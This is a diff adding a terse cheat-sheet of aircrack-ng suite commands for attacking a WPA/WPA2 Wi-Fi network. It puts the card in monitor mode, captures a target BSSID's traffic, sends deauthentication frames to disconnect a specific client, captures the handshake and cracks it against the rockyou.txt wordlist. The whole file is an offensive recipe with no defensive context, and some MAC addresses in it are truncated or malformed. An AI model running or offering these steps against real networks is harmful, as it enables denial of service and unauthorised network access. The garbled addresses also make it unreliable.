@@ -1,0 +1,15 @@
+iwconfig
+ifconfig wlan0 down
+ifconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+disconnect User:
+airodump-ng wlan0  (Find)
+airodump-ng wlan0 --bssid 7C:A9:6B:50:5C:C5 --channel 11 --write test (T-1)
+aireplay-ng --deauth 100 -a 7C:A9:6B:50:5C:C5 -c 00:F4:8D:80:E3(user)(station) wlan0 (T-2) (Disconnect user)
+
+Passwd Creack:
+airodump-ng --bssid 7C:A9:6B:5C:C5 --channel 11 wlan0 --write test1 (T-1) (handshake file - .cap)
+aireplay-ng --deauth 100 -a 7C:A9:6B:50:5C:C5 -c 00:F4:8D:80:E3(user)(station) wlan0 (T-2)
+aircrack-ng test1.cap (WPA)
+aircrack-ng test1.cap -w rockyou.txt (WPA2)
